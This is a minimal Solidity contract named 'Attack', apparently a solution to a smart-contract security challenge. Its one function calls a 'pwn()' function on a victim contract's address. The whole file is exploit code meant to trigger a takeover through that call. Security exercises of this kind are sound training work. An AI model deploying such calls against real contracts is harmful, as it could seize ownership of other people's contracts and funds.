// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract Attack {
    function attack(address _victim) public {
        (bool success, ) = _victim.call(abi.encodeWithSignature("pwn()"));
        require(success, "transaction failed");
    }
}
